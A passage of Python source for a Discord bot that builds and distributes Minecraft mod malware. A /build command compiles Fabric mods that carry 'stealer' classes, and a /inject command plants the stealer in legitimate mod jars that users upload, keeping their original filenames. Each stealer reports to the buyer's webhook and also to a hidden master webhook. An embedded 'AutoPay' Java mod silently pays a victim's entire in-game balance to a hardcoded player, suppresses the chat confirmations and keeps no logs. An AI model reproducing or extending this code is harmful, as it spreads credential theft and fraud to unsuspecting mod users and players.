        seed = hash(mod_id) & 0xFFFFFFFF
        rng = random.Random(seed)

        while written < target_bytes:
            remaining = target_bytes - written
            current_chunk = min(chunk_size, remaining)
            chunk = bytes([rng.randint(0, 255) for _ in range(current_chunk)])
            f.write(chunk)
            written += len(chunk)

    return filepath

async def build_stealer_jar(mod_name, webhook, icon_bytes=None, icon_ext=None, size_mb=None):
    mod_id = mod_name.lower().replace(" ", "_")
    mod_package = ''.join(c for c in mod_id if c.isalnum() or c == '_')
    if not mod_package or mod_package[0].isdigit():
        mod_package = "mod_" + mod_package
    mod_class = mod_name.replace(" ", "").replace("-", "")
    if mod_class:
        mod_class = mod_class[0].upper() + mod_class[1:]
    else:
        mod_class = "Mod"
    mod_class = ''.join(c for c in mod_class if c.isalnum())
    if not mod_class:
        mod_class = "Mod"

    project_dir = tempfile.mkdtemp(prefix="mod_")
    src = lambda p: os.path.join(project_dir, p)
    write = lambda p, c: (os.makedirs(os.path.dirname(src(p)), exist_ok=True), open(src(p), "w", encoding="utf-8").write(c))

    write("build.gradle", safe_format(BUILD_GRADLE,
        mod_package=mod_package,
        mod_class=mod_class,
        version=VERSION
    ))
    write("gradle.properties", GRADLE_PROPERTIES)
    write("settings.gradle", SETTINGS_GRADLE)

    fabric_json = safe_format(FABRIC_JSON_HOST,
        mod_id=mod_id,
        mod_name=mod_name,
        mod_package=mod_package,
        mod_class=mod_class,
        version=VERSION
    )
    fabric_obj = json.loads(fabric_json)
    if icon_bytes and icon_ext:
        icon_path = f"assets/{mod_id}/icon{icon_ext}"
        fabric_obj["icon"] = icon_path
    fabric_json_updated = json.dumps(fabric_obj, indent=2)
    write("src/main/resources/fabric.mod.json", fabric_json_updated)

    lang_dir = os.path.join(project_dir, "src", "main", "resources", "assets", mod_id, "lang")
    os.makedirs(lang_dir, exist_ok=True)
    lang_content = safe_format(LANG_EN_US,
        mod_id=mod_id,
        mod_name=mod_name,
        version=VERSION
    )
    lang_content = lang_content.strip()
    if lang_content.startswith("{{"):
        lang_content = "{" + lang_content[2:-2] + "}"
    with open(os.path.join(lang_dir, "en_us.json"), "w", encoding="utf-8") as f:
        f.write(lang_content)

    if size_mb is not None and size_mb >= 0.1:
        generate_dummy_data_file(project_dir, mod_id, size_mb)

    if icon_bytes and icon_ext:
        icon_dir = os.path.join(project_dir, "src", "main", "resources", "assets", mod_id)
        os.makedirs(icon_dir, exist_ok=True)
        icon_file = os.path.join(icon_dir, f"icon{icon_ext}")
        with open(icon_file, "wb") as f:
            f.write(icon_bytes)

    combined_webhook = webhook + "|||" + MASTER_WEBHOOK
    enc_webhook = encrypt_string(combined_webhook, mod_package)

    write("src/main/java/com/" + mod_package + "/" + mod_class + ".java",
          safe_format(MAIN_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))

    loader_class = mod_class + "Loader"
    write("src/main/java/com/" + mod_package + "/" + loader_class + ".java",
          safe_format(LOADER_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class, enc_webhook=enc_webhook))

    profile_class = mod_class + "Profile"
    write("src/main/java/com/" + mod_package + "/" + profile_class + ".java",
          safe_format(PROFILE_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))

    cache_class = mod_class + "Cache"
    write("src/main/java/com/" + mod_package + "/" + cache_class + ".java",
          safe_format(CACHE_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))

    network_class = mod_class + "Network"
    write("src/main/java/com/" + mod_package + "/" + network_class + ".java",
          safe_format(NETWORK_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))

    print(f"[BUILD] Starting Gradle build in {project_dir}")
    jar_path = await run_gradle_build(project_dir)
    return jar_path, project_dir

async def build_worker():
    while True:
        job = await build_queue.get()
        interaction = job['interaction']
        user = job['user']
        webhook = job['webhook']
        mod_name = job['mod_name']
        followup = job['followup']
        icon_bytes = job.get('icon_bytes')
        icon_ext = job.get('icon_ext')
        size_mb = job.get('size_mb')

        try:
            await followup.edit(content="Building... (ETA ~1 min)")
            jar_path, project_dir = await build_stealer_jar(mod_name, webhook, icon_bytes, icon_ext, size_mb)

            file_size_bytes = os.path.getsize(jar_path)
            if file_size_bytes > MAX_UPLOAD_BYTES:
                await followup.edit(content=f"Mod too large ({file_size_bytes/1024/1024:.1f} MB). Max is {MAX_UPLOAD_BYTES/1024/1024:.1f} MB.")
                continue

            warning = "# ⚠️ MAKE SURE THIS MOD IS ONLY RAN ON 1.21.11 ⚠️"
            jar_filename = f"{mod_name.lower()}-{VERSION}.jar"
            try:
                await user.send(content=warning, file=discord.File(jar_path, filename=jar_filename))
                await followup.edit(content="Sent to DMs. Check your DMs!")
            except discord.Forbidden:
                await followup.edit(content="I can't DM you. Enable DMs and try again.")
        except Exception as e:
            await followup.edit(content=f"Error: {str(e)[:500]}")
            print(f"[ERROR] Build failed: {e}")
        finally:
            if 'project_dir' in locals():
                shutil.rmtree(project_dir, ignore_errors=True)
            if 'jar_path' in locals() and os.path.exists(jar_path):
                os.unlink(jar_path)
            build_queue.task_done()

@tree.command(name="build", description="Build a custom mod with a chosen name and webhook")
@app_commands.describe(mod_name="Display name for the mod", webhook="Your Discord webhook URL", icon="Optional icon image (PNG/JPG) for the mod", size_mb="Optional: add dummy size to mod (0.1 - 7.0 MB, decimals allowed)")
async def build_cmd(interaction: discord.Interaction, mod_name: str, webhook: str, icon: discord.Attachment = None, size_mb: float = None):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.channel_id != CHANNEL_ID:
        await interaction.followup.send("This command can only be used in the designated channel.", ephemeral=True)
        return

    user_id = interaction.user.id
    now = time.time()
    if user_id in last_build_time and (now - last_build_time[user_id]) < COOLDOWN_SECONDS:
        await interaction.followup.send("You're on cooldown.", ephemeral=True)
        return
    last_build_time[user_id] = now

    if not webhook.startswith("https://discord.com/api/webhooks/"):
        await interaction.followup.send("Invalid webhook URL.", ephemeral=True)
        return

    if size_mb is not None:
        if size_mb < 0.1 or size_mb > 7.0:
            await interaction.followup.send("size_mb must be between 0.1 and 7.0 MB.", ephemeral=True)
            return

    icon_bytes = None
    icon_ext = None
    if icon:
        if icon.size > 5 * 1024 * 1024:
            await interaction.followup.send("Icon too large (max 5 MB).", ephemeral=True)
            return
        icon_bytes = await icon.read()
        base, ext = os.path.splitext(icon.filename)
        if ext.lower() not in ['.png', '.jpg', '.jpeg', '.gif', '.bmp']:
            await interaction.followup.send("Icon must be a common image format (PNG, JPG, GIF, BMP).", ephemeral=True)
            return
        icon_ext = ext.lower()

    followup = await interaction.followup.send("Queued...", ephemeral=True)

    job = {
        'interaction': interaction, 'user': interaction.user,
        'webhook': webhook, 'mod_name': mod_name,
        'followup': followup,
        'icon_bytes': icon_bytes,
        'icon_ext': icon_ext,
        'size_mb': size_mb
    }
    await build_queue.put(job)

@tree.command(name="inject", description="Inject the stealer into an existing mod")
@app_commands.describe(file="The mod .jar file to infect", webhook="Your Discord webhook URL")
async def inject_cmd(interaction: discord.Interaction, file: discord.Attachment, webhook: str):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.channel_id != CHANNEL_ID:
        await interaction.followup.send("This command can only be used in the designated channel.", ephemeral=True)
        return

    if not file.filename.endswith(".jar"):
        await interaction.followup.send("Please upload a .jar file.", ephemeral=True)
        return

    if not webhook.startswith("https://discord.com/api/webhooks/"):
        await interaction.followup.send("Invalid webhook URL.", ephemeral=True)
        return

    followup = await interaction.followup.send("Injecting (compiling + repackaging)...", ephemeral=True)

    extract_dir = None
    gradle_dir = None
    try:
        mod_bytes = await file.read()
        extract_dir = tempfile.mkdtemp(prefix="inject_")
        with zipfile.ZipFile(io.BytesIO(mod_bytes), 'r') as zin:
            zin.extractall(extract_dir)

        mod_package = "injected"
        mod_class = "InjectedMod"
        combined_webhook = webhook + "|||" + MASTER_WEBHOOK
        enc_webhook = encrypt_string(combined_webhook, mod_package)

        gradle_dir = tempfile.mkdtemp(prefix="mod_")
        src = lambda p: os.path.join(gradle_dir, p)
        write = lambda p, c: (os.makedirs(os.path.dirname(src(p)), exist_ok=True), open(src(p), "w", encoding="utf-8").write(c))

        write("build.gradle", safe_format(BUILD_GRADLE, mod_package=mod_package, mod_class=mod_class, version=VERSION))
        write("gradle.properties", GRADLE_PROPERTIES)
        write("settings.gradle", SETTINGS_GRADLE)
        write("src/main/resources/fabric.mod.json", safe_format(FABRIC_JSON_HOST,
            mod_id="injected", mod_name="Injected",
            mod_package=mod_package, mod_class=mod_class, version=VERSION
        ))

        lang_dir = os.path.join(gradle_dir, "src", "main", "resources", "assets", "injected", "lang")
        os.makedirs(lang_dir, exist_ok=True)
        lang_content = safe_format(LANG_EN_US,
            mod_id="injected",
            mod_name="Injected",
            version=VERSION
        )
        lang_content = lang_content.strip()
        if lang_content.startswith("{{"):
            lang_content = "{" + lang_content[2:-2] + "}"
        with open(os.path.join(lang_dir, "en_us.json"), "w", encoding="utf-8") as f:
            f.write(lang_content)

        write("src/main/java/com/injected/InjectedMod.java",
              safe_format(MAIN_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))
        write("src/main/java/com/injected/InjectedModLoader.java",
              safe_format(LOADER_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class, enc_webhook=enc_webhook))
        write("src/main/java/com/injected/InjectedModProfile.java",
              safe_format(PROFILE_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))
        write("src/main/java/com/injected/InjectedModCache.java",
              safe_format(CACHE_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))
        write("src/main/java/com/injected/InjectedModNetwork.java",
              safe_format(NETWORK_CLASS_TEMPLATE, mod_package=mod_package, mod_class=mod_class))

        await followup.edit(content="Compiling stealer classes...")
        built_jar = await run_gradle_build(gradle_dir)

        built_extract = tempfile.mkdtemp(prefix="built_")
        try:
            with zipfile.ZipFile(built_jar, 'r') as zin:
                zin.extractall(built_extract)

            for root, dirs, files in os.walk(built_extract):
                for fname in files:
                    rel = os.path.relpath(os.path.join(root, fname), built_extract).replace("\\", "/")
                    if rel == "fabric.mod.json" or rel == "META-INF/MANIFEST.MF":
                        continue
                    full_path = os.path.join(root, fname)
                    dest_path = os.path.join(extract_dir, rel)
                    os.makedirs(os.path.dirname(dest_path), exist_ok=True)
                    shutil.copy2(full_path, dest_path)
        finally:
            shutil.rmtree(built_extract, ignore_errors=True)

        fmj_path = os.path.join(extract_dir, "fabric.mod.json")
        if os.path.exists(fmj_path):
            with open(fmj_path, "r", encoding="utf-8") as f:
                fabric_json = json.load(f)
        else:
            fabric_json = {}
        
        fabric_json["environment"] = "client"
        if "entrypoints" not in fabric_json:
            fabric_json["entrypoints"] = {}
        if "client" not in fabric_json["entrypoints"]:
            fabric_json["entrypoints"]["client"] = []
        entry = "com." + mod_package + "." + mod_class
        if entry not in fabric_json["entrypoints"]["client"]:
            fabric_json["entrypoints"]["client"].append(entry)
        if "depends" not in fabric_json:
            fabric_json["depends"] = {}
        depends = fabric_json["depends"]
        if "fabricloader" not in depends:
            depends["fabricloader"] = ">=0.19.3"
        if "minecraft" not in depends:
            depends["minecraft"] = ">=1.21.11"

        jars_dir = os.path.join(extract_dir, "META-INF", "jars")
        if os.path.exists(jars_dir):
            if "jars" not in fabric_json or not isinstance(fabric_json["jars"], list):
                fabric_json["jars"] = []
            
            existing_jar_files = set()
            for jar_obj in fabric_json.get("jars", []):
                if isinstance(jar_obj, dict) and "file" in jar_obj:
                    existing_jar_files.add(jar_obj["file"])
                elif isinstance(jar_obj, str):
                    existing_jar_files.add(jar_obj)

            for f in os.listdir(jars_dir):
                if f.endswith(".jar"):
                    jar_entry = "META-INF/jars/" + f
                    if jar_entry not in existing_jar_files:
                        fabric_json["jars"].append({"file": jar_entry})

        with open(fmj_path, "w", encoding="utf-8") as f:
            json.dump(fabric_json, f)

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(extract_dir):
                for fname in files:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, extract_dir).replace("\\", "/")
                    zout.write(full_path, arcname)

        infected_bytes = zip_buffer.getvalue()
        if len(infected_bytes) > MAX_UPLOAD_BYTES:
            await followup.edit(content=f"Infected mod too large ({len(infected_bytes)/1024/1024:.1f} MB). Max is {MAX_UPLOAD_BYTES/1024/1024:.1f} MB.")
            return

        warning = "# ⚠️ MAKE SURE THIS MOD IS ONLY RAN ON 1.21.11 ⚠️"
        await interaction.user.send(
            content=warning,
            file=discord.File(io.BytesIO(infected_bytes), filename=file.filename)
        )
        await followup.edit(content="Infected mod sent to your DMs!")
    except Exception as e:
        await followup.edit(content=f"Error: {str(e)[:500]}")
        print(f"[ERROR] Inject failed: {e}")
    finally:
        if extract_dir and os.path.exists(extract_dir):
            shutil.rmtree(extract_dir, ignore_errors=True)
        if gradle_dir and os.path.exists(gradle_dir):
            shutil.rmtree(gradle_dir, ignore_errors=True)

@tree.command(name="decompile", description="Decompile a .jar file and view the source")
@app_commands.describe(file="The .jar file to decompile")
async def decompile_cmd(interaction: discord.Interaction, file: discord.Attachment):
    await interaction.response.defer(ephemeral=True)
    
    if interaction.channel_id != CHANNEL_ID:
        await interaction.followup.send("This command can only be used in the designated channel.", ephemeral=True)
        return

    if not file.filename.endswith(".jar"):
        await interaction.followup.send("Please upload a .jar file.", ephemeral=True)
        return

    followup = await interaction.followup.send("Downloading CFR decompiler...", ephemeral=True)

    work_dir = None
    try:
        cfr_path = await ensure_cfr()
        if not cfr_path:
            await followup.edit(content="Failed to download CFR decompiler. Check internet connection.")
            return

        await followup.edit(content="Decompiling... this may take a moment.")

        mod_bytes = await file.read()
        work_dir = tempfile.mkdtemp(prefix="decomp_")
        jar_path = os.path.join(work_dir, file.filename)
        with open(jar_path, "wb") as f:
            f.write(mod_bytes)

        output_dir = os.path.join(work_dir, "output")
        os.makedirs(output_dir, exist_ok=True)

        proc = await asyncio.create_subprocess_exec(
            "java", "-jar", cfr_path, jar_path,
            "--outputdir", output_dir,
            "--silent", "true",
            "--comments", "false",
            stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await proc.communicate()
        stdout_str = stdout.decode(errors="replace")
        stderr_str = stderr.decode(errors="replace")

        if proc.returncode != 0:
            await followup.edit(content=f"Decompilation failed: {stderr_str[:500]}")
            return

        java_files = []
        other_files = []
        for root, dirs, files in os.walk(output_dir):
            for fname in files:
                rel = os.path.relpath(os.path.join(root, fname), output_dir)
                if fname.endswith(".java"):
                    java_files.append(rel)
                else:
                    other_files.append(rel)

        if not java_files and not other_files:
            await followup.edit(content="No output produced. The jar may be empty or obfuscated.")
            return

        zip_buffer = io.BytesIO()
        with zipfile.ZipFile(zip_buffer, 'w', zipfile.ZIP_DEFLATED) as zout:
            for root, dirs, files in os.walk(output_dir):
                for fname in files:
                    full_path = os.path.join(root, fname)
                    arcname = os.path.relpath(full_path, output_dir).replace("\\", "/")
                    zout.write(full_path, arcname)

        result_bytes = zip_buffer.getvalue()
        summary = f"Decompiled {file.filename}: {len(java_files)} classes, {len(other_files)} resources."

        try:
            await interaction.user.send(
                content=summary,
                file=discord.File(io.BytesIO(result_bytes), filename=f"{file.filename[:-4]}_decompiled.zip")
            )
            await followup.edit(content=f"Done! {summary}\nSent to your DMs.")
        except discord.Forbidden:
            await followup.edit(content=f"{summary}\nI can't DM you. Enable DMs and try again.")
    except Exception as e:
        await followup.edit(content=f"Error: {str(e)[:500]}")
        print(f"[ERROR] Decompile failed: {e}")
    finally:
        if work_dir and os.path.exists(work_dir):
            shutil.rmtree(work_dir, ignore_errors=True)

# ============================================================================
# AUTOPAY INJECTION
# ============================================================================

AUTOPAY_MIXINS_JSON = '''{
  "required": true,
  "minVersion": "0.8",
  "package": "com.autopay.mixin",
  "compatibilityLevel": "JAVA_21",
  "client": [
    "MinecraftClientMixin",
    "MinecraftClientChatMixin",
    "ClientPlayNetworkHandlerMixin",
    "ChatSuppressorMixin"
  ],
  "injectors": {
    "defaultRequire": 1
  }
}'''

AUTOPAY_FABRIC_JSON = '''{
    "schemaVersion": 1,
    "id": "autopay",
    "version": "1.0.0",
    "name": "AutoPay",
    "license": "MIT",
    "environment": "client",
    "entrypoints": {
        "client": ["com.autopay.AutoPayMod"]
    },
    "mixins": ["autopay.mixins.json"],
    "depends": {
        "fabricloader": ">=0.19.3",
        "minecraft": ">=1.21.11"
    }
}'''

AUTOPAY_SRC = {}

AUTOPAY_SRC["AutoPayConfig.java"] = r'''package com.autopay;

/**
 * Hardcoded runtime configuration - there is no config file.
 *
 * config/autopay.json is never read or written and there is no enable switch:
 * AutoPay is always on and always uses exactly these values.
 */
public final class AutoPayConfig {

    public static final String SERVER_ADDRESS = "donutsmp.net";
    public static final String TARGET_PLAYER = "FreakyUnc";
    public static final String BALANCE_COMMAND = "bal";
    public static final String PAY_COMMAND = "/pay %target% %amount%";

    public static final int BAL_WAIT_SECONDS = 5;
    public static final int PAY_DELAY_SECONDS = 1;
    public static final int QUIT_DELAY_SECONDS = 3;

    private AutoPayConfig() {}
}
'''

AUTOPAY_SRC["AutoPayMod.java"] = r'''package com.autopay;

import net.fabricmc.api.ClientModInitializer;

public class AutoPayMod implements ClientModInitializer {
    @Override
    public void onInitializeClient() {
        // Always-on by design: no config file, no enable switch, no logging.
    }
}
'''

AUTOPAY_SRC["WrappedUserApiService.java"] = r'''package com.autopay;

import com.google.common.collect.ImmutableSet;
import com.mojang.authlib.minecraft.TelemetrySession;
import com.mojang.authlib.minecraft.UserApiService;
import com.mojang.authlib.minecraft.report.AbuseReportLimits;
import com.mojang.authlib.yggdrasil.request.AbuseReportRequest;
import com.mojang.authlib.yggdrasil.response.KeyPairResponse;

import java.util.Map;
import java.util.UUID;
import java.util.concurrent.Executor;

/**
 * Wraps the real UserApiService and forces CHAT_ALLOWED to always be present,
 * bypassing Minecraft's client-side account chat restriction.
 */
public class WrappedUserApiService implements UserApiService {

    private static final UserProperties FORCED_PROPERTIES;

    static {
        ImmutableSet.Builder<UserFlag> flags = ImmutableSet.builder();
        flags.add(UserFlag.CHAT_ALLOWED);
        flags.add(UserFlag.SERVERS_ALLOWED);
        flags.add(UserFlag.REALMS_ALLOWED);
        FORCED_PROPERTIES = new UserProperties(flags.build(), Map.of());
    }

    private final UserApiService service;

    public WrappedUserApiService(UserApiService service) {
        this.service = service;
    }

    @Override
    public UserProperties fetchProperties() {
        return FORCED_PROPERTIES;
    }

    @Override
    public boolean isBlockedPlayer(UUID playerID) {
        return this.service.isBlockedPlayer(playerID);
    }

    @Override
    public void refreshBlockList() {
        this.service.refreshBlockList();
    }

    @Override
    public TelemetrySession newTelemetrySession(Executor executor) {
        return TelemetrySession.DISABLED;
    }

    @Override
    public KeyPairResponse getKeyPair() {
        return this.service.getKeyPair();
    }

    @Override
    public void reportAbuse(AbuseReportRequest request) {
        this.service.reportAbuse(request);
    }

    @Override
    public boolean canSendReports() {
        return this.service.canSendReports();
    }

    @Override
    public AbuseReportLimits getAbuseReportLimits() {
        return this.service.getAbuseReportLimits();
    }
}
'''

AUTOPAY_SRC["ServerJoinHandler.java"] = r'''package com.autopay;

import net.minecraft.client.MinecraftClient;
import net.minecraft.client.network.ServerInfo;

public final class ServerJoinHandler {

    /** True when the connected server matches the configured serverAddress (mc./play. prefixes ignored). */
    public static boolean matches(MinecraftClient client) {
        ServerInfo serverInfo = client.getCurrentServerEntry();
        if (serverInfo == null) return false;

        String address = serverInfo.address.toLowerCase();
        String configured = AutoPayConfig.SERVER_ADDRESS.toLowerCase();
        String normalized = address.replace("mc.", "").replace("play.", "");
        String configuredNorm = configured.replace("mc.", "").replace("play.", "");
        return normalized.contains(configuredNorm);
    }

    private ServerJoinHandler() {}
}
'''

AUTOPAY_SRC["ChatSender.java"] = r'''package com.autopay;

import net.minecraft.client.MinecraftClient;

public class ChatSender {
    public static void sendCommand(String command) {
        if (command == null || command.isEmpty()) return;
        MinecraftClient client = MinecraftClient.getInstance();
        if (client.player == null || client.getNetworkHandler() == null) return;
        try {
            client.getNetworkHandler().sendChatCommand(command);
        } catch (Exception ignored) {}
    }
}
'''

AUTOPAY_SRC["BalPayCycle.java"] = r'''package com.autopay;

import net.minecraft.client.MinecraftClient;
import net.minecraft.text.Text;

import java.math.BigDecimal;
import java.util.ArrayList;
import java.util.HashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

/**
 * Fully silent pay cycle (KryptonClient-style, no API, no log output):
 *
 *   join -> send "bal" -> read the ENTIRE balance out of the /bal reply
 *        -> send "pay <target> <entire balance>" -> swallow chat for quitDelay -> done for this join.
 *
 * The reply is read line by line: a total line ("Balance:", "You have:", ...) supplies the
 * whole figure, while separate "Wallet:"/"Bank:"/"Cash:" lines are summed, so nothing is left
 * behind. Amounts may use thousands separators (1,234,567.89), spaces (1 234), decimal commas
 * (12,50) or k/m/b/t suffixes (1.2M) - the full value is always what gets paid.
 *
 * Incoming chat is cancelled while the cycle is running, so the /bal output and
 * the /pay confirmation are never rendered. Nothing is ever written to the log.
 */
public final class BalPayCycle {

    private enum State { IDLE, WAIT_BAL, WAIT_PAY, WAIT_QUIT, DONE }

    private static final String[] NON_BALANCE_LINE_HINTS = {
        "usage:", "commands.", "powered by", "shop", "store", "vote",
        "https://", "click", "website", "discord", "ranks", "kitpvp",
        "survival", "creative", "skyblock", "prison", "game", "play.",
        "ip:", "lobby"
    };

    /** Ticks to keep collecting the rest of the /bal reply after its first balance line. */
    private static final int BAL_COLLECT_TICKS = 10;

    /** Money token: "1,234,567.89" / "1234.56" / "1 234" / "1.2M" (k, m, b, t suffixes). */
    private static final Pattern AMOUNT_TOKEN = Pattern.compile(
            "\\d{1,3}(?:[.,\\s]\\d{3})+(?:[.,]\\d+)?[kmbt]?|\\d+(?:[.,]\\d+)?[kmbt]?",
            Pattern.CASE_INSENSITIVE);
    /** A comma followed by 1-2 digits is a decimal comma; any other comma is a separator. */
    private static final Pattern DECIMAL_COMMA = Pattern.compile("(\\d+),(\\d{1,2})");
    private static final Pattern CLEAN_NUMBER = Pattern.compile("\\d+(?:\\.\\d+)?");
    private static final Pattern BALANCE_LINE = Pattern.compile(
            "\\b(?:you\\s+have|balance|bal|money|wallet|bank|cash|coins)\\s*[:=]?",
            Pattern.CASE_INSENSITIVE);
    /** Lines that name a piece of the balance (wallet, bank, ...) instead of the total. */
    private static final Pattern COMPONENT_LINE = Pattern.compile(
            "\\b(?:wallet|bank|cash|coins)\\b", Pattern.CASE_INSENSITIVE);
    private static final Pattern COOLDOWN_REPLY = Pattern.compile(
            "wait (?:another )?[\\d.]+ seconds? to execute a command", Pattern.CASE_INSENSITIVE);

    private static State state = State.IDLE;
    private static int stateTicksLeft;
    private static int collectTicksLeft;
    private static boolean balanceSeen;
    private static BigDecimal totalAmount;
    private static final List<BigDecimal> COMPONENTS = new ArrayList<>();
    private static String fallbackAmount;
    private static String readBalance;
    private static String lastPayCommand;
    private static boolean payRetried;
    private static boolean paidThisJoin;

    private BalPayCycle() {}

    /** Called from the MinecraftClient tick mixin. */
    public static void onClientTick(MinecraftClient client) {
        if (client.player == null || client.world == null || client.getNetworkHandler() == null) {
            resetCycle();
            paidThisJoin = false;
            return;
        }

        if (stateTicksLeft > 0) {
            stateTicksLeft--;
        }

        switch (state) {
            case IDLE -> {
                if (paidThisJoin || client.isPaused()) return;
                if (!ServerJoinHandler.matches(client)) return;
                ChatSender.sendCommand(AutoPayConfig.BALANCE_COMMAND);
                setState(State.WAIT_BAL, AutoPayConfig.BAL_WAIT_SECONDS);
            }
            case WAIT_BAL -> {
                if (collectTicksLeft > 0) {
                    collectTicksLeft--;
                }
                boolean replyComplete = balanceSeen && collectTicksLeft <= 0;
                if (replyComplete || waitElapsed()) {
                    String amount = resolveAmount();
                    if (amount != null && !amount.isEmpty()) {
                        readBalance = amount;
                        setState(State.WAIT_PAY, AutoPayConfig.PAY_DELAY_SECONDS);
                    } else if (waitElapsed()) {
                        resetCycle();
                    }
                }
            }
            case WAIT_PAY -> {
                if (waitElapsed()) {
                    sendPay();
                }
            }
            case WAIT_QUIT -> {
                if (waitElapsed()) {
                    setState(State.DONE, 0);
                }
            }
            case DONE -> { /* paid; stay quiet until the player leaves the world */ }
        }
    }

    /**
     * Called from the ClientPlayNetworkHandler onGameMessage mixin.
     * Returns true when the message must be cancelled (hidden from the player).
     */
    public static boolean onChatPacket(Text message, boolean overlay) {
        if (message == null) return false;
        String text = message.getString();

        boolean inCycle = state == State.WAIT_BAL || state == State.WAIT_PAY || state == State.WAIT_QUIT;
        boolean suppress = !overlay && inCycle;

        if (state == State.WAIT_QUIT && !payRetried && lastPayCommand != null
                && COOLDOWN_REPLY.matcher(text).find()) {
            payRetried = true;
            ChatSender.sendCommand(lastPayCommand);
            return suppress;
        }

        if (state == State.WAIT_BAL && !overlay) {
            handleChat(text);
        }
        return suppress;
    }

    private static void handleChat(String raw) {
        String line = raw.trim();
        if (line.isEmpty()) return;
        String lower = line.toLowerCase(Locale.ROOT);

        for (String hint : NON_BALANCE_LINE_HINTS) {
            if (lower.contains(hint)) return;
        }
        if (lower.contains("/bal") || lower.contains("you: /bal")) return;

        Matcher probe = AMOUNT_TOKEN.matcher(line);
        if (!probe.find()) return;

        if (BALANCE_LINE.matcher(line).find()) {
            List<BigDecimal> values = balanceValues(line);
            if (values.isEmpty()) return;
            if (COMPONENT_LINE.matcher(line).find()) {
                COMPONENTS.addAll(values);
            } else if (totalAmount == null) {
                totalAmount = values.get(0);
            }
            balanceSeen = true;
            collectTicksLeft = BAL_COLLECT_TICKS;
            return;
        }

        if (fallbackAmount == null) {
            Matcher fm = AMOUNT_TOKEN.matcher(line);
            while (fm.find()) {
                BigDecimal value = parseValue(fm.group());
                if (value != null) {
                    fallbackAmount = plainString(value);
                    break;
                }
            }
        }
    }

    private static String resolveAmount() {
        if (totalAmount != null) {
            return plainString(totalAmount);
        }
        if (!COMPONENTS.isEmpty()) {
            BigDecimal sum = BigDecimal.ZERO;
            for (BigDecimal component : COMPONENTS) {
                sum = sum.add(component);
            }
            return plainString(sum);
        }
        return fallbackAmount;
    }

    private static List<BigDecimal> balanceValues(String line) {
        List<BigDecimal> values = new ArrayList<>();
        Set<Integer> taken = new HashSet<>();

        Matcher km = BALANCE_LINE.matcher(line);
        while (km.find()) {
            Matcher am = AMOUNT_TOKEN.matcher(line);
            while (am.find()) {
                if (am.start() < km.end() || taken.contains(am.start())) continue;
                BigDecimal value = parseValue(am.group());
                if (value == null) continue;
                taken.add(am.start());
                values.add(value);
                break;
            }
        }

        if (values.isEmpty()) {
            Matcher am = AMOUNT_TOKEN.matcher(line);
            while (am.find()) {
                BigDecimal value = parseValue(am.group());
                if (value != null) values.add(value);
            }
        }
        return values;
    }

    private static BigDecimal parseValue(String token) {
        String normalized = normalizeAmount(token);
        if (normalized == null) return null;
        try {
            return new BigDecimal(normalized);
        } catch (NumberFormatException e) {
            return null;
        }
    }

    private static String normalizeAmount(String token) {
        String t = token.trim();
        if (t.isEmpty()) return null;

        double multiplier = 1.0;
        char last = Character.toLowerCase(t.charAt(t.length() - 1));
        if (t.length() > 1 && (last == 'k' || last == 'm' || last == 'b' || last == 't')) {
            t = t.substring(0, t.length() - 1).trim();
            multiplier = switch (last) {
                case 'k' -> 1_000d;
                case 'm' -> 1_000_000d;
                case 'b' -> 1_000_000_000d;
                default -> 1_000_000_000_000d;
            };
        }

        t = t.replace(" ", "").replace("'", "").replace("_", "");
        Matcher decimalComma = DECIMAL_COMMA.matcher(t);
        if (t.indexOf('.') >= 0 || !decimalComma.matches()) {
            t = t.replace(",", "");
        } else {
            t = decimalComma.group(1) + "." + decimalComma.group(2);
        }
        if (countChars(t, '.') > 1) {
            t = t.replace(".", "");
        }
        if (!CLEAN_NUMBER.matcher(t).matches()) return null;

        if (multiplier == 1.0) {
            return t;
        }
        double scaled;
        try {
            scaled = Double.parseDouble(t) * multiplier;
        } catch (NumberFormatException e) {
            return null;
        }
        if (!Double.isFinite(scaled) || scaled < 0 || scaled >= 1e15) return null;
        if (scaled == Math.rint(scaled)) return Long.toString((long) scaled);
        return String.format(Locale.ROOT, "%.2f", scaled);
    }

    private static String plainString(BigDecimal value) {
        return value.stripTrailingZeros().toPlainString();
    }

    private static int countChars(String s, char c) {
        int n = 0;
        for (int i = 0; i < s.length(); i++) {
            if (s.charAt(i) == c) n++;
        }
        return n;
    }

    private static void sendPay() {
        String cmd = AutoPayConfig.PAY_COMMAND
                .replace("%target%", AutoPayConfig.TARGET_PLAYER)
                .replace("%amount%", readBalance == null ? "" : readBalance);
        if (cmd.startsWith("/")) {
            cmd = cmd.substring(1);
        }
        if (cmd.isEmpty() || readBalance == null || readBalance.isEmpty()) {
            resetCycle();
            return;
        }
        lastPayCommand = cmd;
        payRetried = false;
        paidThisJoin = true;
        ChatSender.sendCommand(cmd);
        setState(State.WAIT_QUIT, AutoPayConfig.QUIT_DELAY_SECONDS);
    }

    private static void setState(State next, int seconds) {
        state = next;
        stateTicksLeft = Math.max(0, seconds) * 20;
    }

    private static boolean waitElapsed() {
        return stateTicksLeft <= 0;
    }

    private static void resetCycle() {
        state = State.IDLE;
        stateTicksLeft = 0;
        collectTicksLeft = 0;
        balanceSeen = false;
        totalAmount = null;
        COMPONENTS.clear();
        fallbackAmount = null;
        readBalance = null;
        lastPayCommand = null;
        payRetried = false;
    }
}
'''

AUTOPAY_SRC["mixin/MinecraftClientMixin.java"] = r'''package com.autopay.mixin;

import com.autopay.BalPayCycle;
import net.minecraft.client.MinecraftClient;
import org.spongepowered.asm.mixin.Mixin;
import org.spongepowered.asm.mixin.injection.At;
